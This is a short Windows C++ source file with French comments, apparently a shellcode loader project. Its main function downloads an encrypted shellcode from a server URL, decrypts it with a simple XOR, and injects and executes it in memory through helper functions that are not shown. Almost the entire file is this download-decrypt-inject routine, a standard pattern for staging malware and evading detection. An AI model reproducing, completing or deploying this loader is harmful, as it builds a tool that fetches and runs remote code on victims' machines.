#include <windows.h>
#include "http_client.h"
#include "memory_handler.h"
#include "chiffrement.h"

// Point d'entrée principal
int main() {
    // URL du serveur Python pour télécharger le shellcode
    const char* server_url = "http://127.0.0.1:8000/shellcode.bin";

    char* encrypted_shellcode = nullptr; // Stocke le shellcode chiffré
    size_t shellcode_size = 436;           // Taille du shellcode téléchargé
    char* decrypted_shellcode = new char[shellcode_size-3]; // Le reste du shellcode chiffré

    // Étape 1 : Télécharger le shellcode chiffré depuis le serveur
    if (!download_shellcode(server_url, &encrypted_shellcode, &shellcode_size)) {
        return -1; // Erreur lors du téléchargement
    }

    // Étape 2 : Déchiffrer le shellcode (utilisation d'un XOR simple)
    decrypt_shellcode(encrypted_shellcode, decrypted_shellcode, shellcode_size-3);

    // test_shellcode(decryptedShellcode, shellcode_size-3);

    // Étape 3 : Injecter et exécuter le shellcode
    if (!inject_shellcode(decrypted_shellcode, shellcode_size-3)) {
        delete[] decrypted_shellcode; // Libération de la mémoire
        delete[] encrypted_shellcode; // Libération de la mémoire
        return -2; // Erreur lors de l'injection
    }

    return 0; // Fin du programme
}
